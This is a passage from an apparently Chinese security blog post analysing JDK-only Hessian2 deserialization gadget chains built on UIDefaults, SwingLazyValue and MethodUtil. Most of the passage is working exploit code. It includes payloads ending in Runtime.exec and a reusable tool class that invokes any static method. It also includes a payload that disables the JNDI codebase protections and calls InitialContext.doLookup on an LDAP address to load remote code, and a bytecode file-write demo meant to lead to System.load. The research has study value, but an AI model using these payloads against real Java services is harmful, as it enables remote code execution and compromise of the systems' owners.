class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Payload1();</span></span><br><span class="line">        Payload2();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Payload1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invokeMethod</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, slz);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">ml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        Reflections.setFieldValue(ml,<span class="string">&quot;parameters&quot;</span>,uiDefaults);</span><br><span class="line">        Hessian2_expect.evilGenerate(ml);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Payload2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invokeMethod</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID,slz);</span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">pkcs9Attributes</span> <span class="operator">=</span> Reflections.createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        Reflections.setFieldValue(pkcs9Attributes,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        Hessian2_expect.evilGenerate(pkcs9Attributes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先讲链子，该利用链是从XString 的 CVE-2021-21346 这个链子转化而来（当时学的比较简略，这里好好跟一跟。</p>
<p>首先Hessian2的出发点是 CVE-2021-43297 。通过错误字节报错触发toString。（详情见Dubbo的笔记内容）</p>
<p>然后我们可以先选用上面发现的其中一个类：MimeTypeParameterList</p>
<p><strong>MimeTypeParameterList#toString</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230218175403683.png"
                      alt="image-20230218175403683"
                ></p>
<p>会去触发 this.parameters.get ，这个 parameters 便是我们设置的 UIDefaults（继承HashTable，我们也是通过这个特征能够更好的使用tabby进行挖掘利用链）。</p>
<p><strong>UIDefaults#get</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getFromHashtable( key );</span><br><span class="line">    <span class="keyword">return</span> (value != <span class="literal">null</span>) ? value : getFromResourceBundle(key, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进getFromHashtable</p>
<p><strong>UIDefaults#getFromHashtable</strong></p>
<p>这个方法挺长，大概称述一下进行的操作，首先通过UIDefaults获取key对应的value，判断value，如果不满足以下其一，则退出</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">value != PENDING</span><br><span class="line">value <span class="keyword">instanceof</span> ActiveValue</span><br><span class="line">value <span class="keyword">instanceof</span> LazyValue</span><br></pre></td></tr></table></figure></div>

<p>我们设置的value是 SwingLazyValue ，显然满足第二个，继续往下走。</p>
<p>然后进行了一个put操作，后续就会触发我们的关键代码 value.createValue，而value我们设置的为 SwingLazyValue 对象</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230218180353389.png"
                      alt="image-20230218180353389"
                ></p>
<p><strong>SwingLazyValue#createValue</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">createValue</span><span class="params">(UIDefaults var1)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ReflectUtil.checkPackageAccess(<span class="built_in">this</span>.className);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> Class.forName(<span class="built_in">this</span>.className, <span class="literal">true</span>, (ClassLoader)<span class="literal">null</span>);</span><br><span class="line">            Class[] var3;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.methodName != <span class="literal">null</span>) &#123;</span><br><span class="line">                var3 = <span class="built_in">this</span>.getClassArray(<span class="built_in">this</span>.args);</span><br><span class="line">                <span class="type">Method</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getMethod(<span class="built_in">this</span>.methodName, var3);</span><br><span class="line">                <span class="built_in">this</span>.makeAccessible(var6);</span><br><span class="line">                <span class="keyword">return</span> var6.invoke(var2, <span class="built_in">this</span>.args);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var3 = <span class="built_in">this</span>.getClassArray(<span class="built_in">this</span>.args);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getConstructor(var3);</span><br><span class="line">                <span class="built_in">this</span>.makeAccessible(var4);</span><br><span class="line">                <span class="keyword">return</span> var4.newInstance(<span class="built_in">this</span>.args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>处理逻辑：</p>
<p>首先通过 checkPackageAccess 判断类名是否正确。然后通过反射获取类赋给var2。</p>
<p>之后利用 getClassArray 将 this.args 参数（是一个Object数组）里面的所有类对象的类拿到。</p>
<p>再之后，对var2调用反射获取对应方法，方法名为this.methodName，参数类型为var3。</p>
<p>然后 makeAccessible 的操作等价于 setAccessible</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">makeAccessible</span><span class="params">(<span class="keyword">final</span> AccessibleObject var1)</span> &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                var1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>之后返回调用内容 var6.invoke(var2, this.args);</p>
<p>这里就相当于实现了一次反射，而恰好这里面的内容我们均可控。我们看看 SwingLazyValue 的其中一个有意思的构造方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SwingLazyValue</span><span class="params">(String var1, String var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.className = var1;</span><br><span class="line">        <span class="built_in">this</span>.methodName = var2;</span><br><span class="line">        <span class="keyword">if</span> (var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.args = (Object[])var3.clone();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>配合上面的代码，实际上触发的内容等价于下面的内容</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">var1.getClass.getMethod(var2, getClassArray(var3)).invoke(Class.forName(<span class="built_in">this</span>.className, <span class="literal">true</span>, (ClassLoader)<span class="literal">null</span>), <span class="built_in">this</span>.args);</span><br></pre></td></tr></table></figure></div>

<p>也就是通过这个构造方法，第一个参数是类名，第二个是要调用的方法名，第三个是方法参数。这里就有个地方需要被我们关注到了，就是我们在使用 Invoke 方法的时候，我们的第一个参数是个Class类型的值，而一般来说反射需要的是对应类的实例对象才行，所以这里的方法调用只能去触发 static静态方法。<font color="red"><strong>所以直接去触发exec方法是不可行的</strong></font>，因此多加了一步，去调用 MethodUtils  的 invoke方法。</p>
<p>（因为需要第三个参数满足调用方法的参数类型，因此有了第一次的构造样子）构造如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;</span><br><span class="line">                &#125;);</span><br></pre></td></tr></table></figure></div>



<p><strong>继续看我们的这里重点讲的 MethodUtils  类的invoke方法，这里的invoke实际上被调用了两次</strong></p>
<p>由于我们 SwingLazyValue  构造的是：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;</span><br><span class="line">                &#125;);</span><br></pre></td></tr></table></figure></div>

<p>它会去反射触发invoke方法，这是第一次。</p>
<p>此时的内容等价于：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">MethodUtil.invoke(invokeMethod,<span class="keyword">new</span> <span class="title class_">Object</span>(),<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure></div>

<p>我们看看invoke具体内容</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> bounce.invoke((Object)<span class="literal">null</span>, var0, var1, var2);</span><br><span class="line">   &#125; <span class="keyword">catch</span>()&#123;</span><br><span class="line">   	....</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>继续看 bounce.invoke ，而 bounce 为Method的类，这里就相当于触发了 Method 的 invoke 方法</p>
<p>可以自己继续往下跟，最终又会回到该invoke方法（我是看了的，但是苦于表达拙劣，写不清楚。。），我就简单说说结果</p>
<p><strong>这个 MethodUtils  类的 invoke 方法相当于是</strong></p>
<p>第一个参数为Method类型的需要使用的方法名，第二个为调用对象，第三为Object数组，数组里面的内容会根据类型自动查找合适的方法，并将其作为作为方法的参数。</p>
<p>因此第一次调用会调用 invokeMethod （为MethodUtil.invoke），对象为Object的实例（由于为静态方法，可以通过Object调用），第三个参数为参数值，因此通过这次之后，触发以下内容</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">MethodUtil.invoke(exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div>

<p>exec为我们写好的 Runtime#exec 方法。与上面同理，通过这种调用，可以变为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.exec(“calc”);</span><br></pre></td></tr></table></figure></div>

<p>最终导致命令执行</p>
<p>如果想获取String[]类型值的exec方法，通过上面的构造，不难想到为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Object[]&#123;String[]&#123;cmd&#125;&#125;</span><br></pre></td></tr></table></figure></div>



<p>这个利用链构造上来说感觉还是比较精妙的，很难想到。</p>
<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.equals</span><br><span class="line">	UIDefault.get</span><br><span class="line">    		UIDefaults.getFromHashTable</span><br><span class="line">       			UIDefaults$LazyValue.createValue</span><br><span class="line">       				SwingLazyValue.createValue</span><br><span class="line">            				MethodUtil.invoke</span><br><span class="line">                				MethodUtil.invoke</span><br><span class="line">                    					Runtime.getRuntime.exec</span><br></pre></td></tr></table></figure></div>



<h2 id="🚩部分总结-UIDefaults-SwingLazyValue执行任意静态方法"><a href="#🚩部分总结-UIDefaults-SwingLazyValue执行任意静态方法" class="headerlink" title="🚩部分总结-UIDefaults&amp;SwingLazyValue执行任意静态方法"></a>🚩部分总结-UIDefaults&amp;SwingLazyValue执行任意静态方法</h2><p>(有局限性，后面会提到)</p>
<p><strong>总结为以下工具类</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_OnlyJDK_Tool</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AnyStaticMethodExecute1</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        SwingLazyValue value= <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(className, methodName, args);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.CHALLENGE_PASSWORD_OID,value);</span><br><span class="line">        Object o=Reflections.createWithoutConstructor(Class.forName(<span class="string">&quot;sun.security.pkcs.PKCS9Attributes&quot;</span>));</span><br><span class="line">        Reflections.setFieldValue(o,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        evilGenerate(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AnyStaticMethodExecute2</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        SwingLazyValue value= <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(className, methodName, args);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, value);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">ml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        Reflections.setFieldValue(ml, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">        evilGenerate(ml);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evilGenerate</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory1.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        Reflections.setFieldValue(out, <span class="string">&quot;_serializerFactory&quot;</span>, serializerFactory1);</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line">        <span class="type">byte</span>[] classBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">byte</span>[] evilByte = <span class="keyword">new</span> <span class="title class_">byte</span>[classBytes.length + <span class="number">2</span>];</span><br><span class="line">        evilByte[<span class="number">0</span>] = <span class="number">67</span>;</span><br><span class="line">        evilByte[<span class="number">1</span>] = <span class="number">67</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; classBytes.length; i++) &#123;</span><br><span class="line">            evilByte[<span class="number">2</span> + i] = classBytes[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>((evilByte)));</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="②InitalContext-doLookup"><a href="#②InitalContext-doLookup" class="headerlink" title="②InitalContext.doLookup"></a>②InitalContext.doLookup</h2><p>由于很多时候是高版本的jdk，所以很多时候必须需要依靠Tomcat的依赖进行绕过，如果没有Tomcat的依赖，可能会打不通。</p>
<p>学过高版本jdni注入，以下内容是众所周知的。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">JDK 5U45,JDK 6U45,JDK 7u21,JDK 8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了<span class="literal">true</span>。</span><br><span class="line">JDK 6u132, JDK 7u122, JDK 8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了<span class="literal">false</span>。</span><br></pre></td></tr></table></figure></div>

<p>如果懒得进行绕过的话，可以手动关闭。本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：</p>
<p>System.setProperty，当然，一般情况下项目环境铁不会有这么好的设置就是了。</p>
<p>但是凑巧都是静态方法，我们可以通过反序列化使其自己执行，这里就打破了需要Tomcat和Spring的指定依赖的限制。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">java.lang.System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">java.lang.System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure></div>



<p>这个类的利用非常简单，本身就是一个静态方法，我们可以通过上面的总结很容易得出我们是可以去直接调用这个方法的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222211619476.png"
                      alt="image-20230222211619476"
                ></p>
<p>于是payload显而易见</p>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InitialContext_doLookup</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        java.lang.System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">        java.lang.System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        java.lang.System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分四步发送，每一次反序列化都会报错退出，当然如果进行修改，不对其进行反序列化也可。但是还是得分四部发送。</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new String[]&#123;&quot;java.rmi.server.useCodebaseOnly&quot;,&quot;false&quot;&#125;);</span></span><br><span class="line"><span class="comment">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new String[]&#123;&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;&#125;);</span></span><br><span class="line"><span class="comment">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new String[]&#123;&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;&#125;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(<span class="string">&quot;javax.naming.InitialContext&quot;</span>,<span class="string">&quot;doLookup&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ldap://127.0.0.1:1389/vfylq9&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="③DumpBytecode-dumpBytecode-System-load"><a href="#③DumpBytecode-dumpBytecode-System-load" class="headerlink" title="③DumpBytecode.dumpBytecode + System.load"></a>③DumpBytecode.dumpBytecode + System.load</h2><p>该利用方法由发现者本人来说，是因为环境禁用了 <code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code> 而该类下存在一个写文件的方法，由于它被禁了，所以作者希望寻找一个是静态方法的方法，并且具有写文件的操作，去执行写文件。（我认为是想通过写入DLL，然后使用System.load去动态加载链接库）</p>
<p>如果这个类没被禁的话，其实可以直接使用它去写入文件的，看看该类的对应方法执行的操作</p>
<p>com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void writeBytesToFilename(String filename, byte[] bytes) &#123;</span><br><span class="line">    if (filename != null &amp;&amp; bytes != null) &#123;</span><br><span class="line">        try (OutputStream outputStream = Files.newOutputStream(Paths.get(filename))) &#123;</span><br><span class="line">            outputStream.write(bytes);</span><br></pre></td></tr></table></figure></div>

<p>最终找到 <code>jdk.nashorn.internal.codegen.DumpBytecode#dumpBytecode</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222223152065.png"
                      alt="image-20230222223152065"
                ></p>
<p>参数都是可控的，可以写后缀为.class文件，并且目录不存在的话会创建目录</p>
<p>可以先写个小demo测试一下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.codegen.DumpBytecode;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.ScriptEnvironment;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.logging.DebugLogger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DumpBytecode_dumpBytecode_System_load</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">script</span> <span class="operator">=</span> Reflections.createWithoutConstructor(ScriptEnvironment.class);</span><br><span class="line">        Object debug= Reflections.createWithoutConstructor(DebugLogger.class);</span><br><span class="line">        <span class="type">byte</span>[] code= <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        String classname=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(<span class="string">&quot;jdk.nashorn.internal.codegen.DumpBytecode&quot;</span>,<span class="string">&quot;dumpBytecode&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                script,</span><br><span class="line">                debug,</span><br><span class="line">                code,</span><br><span class="line">                classname</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

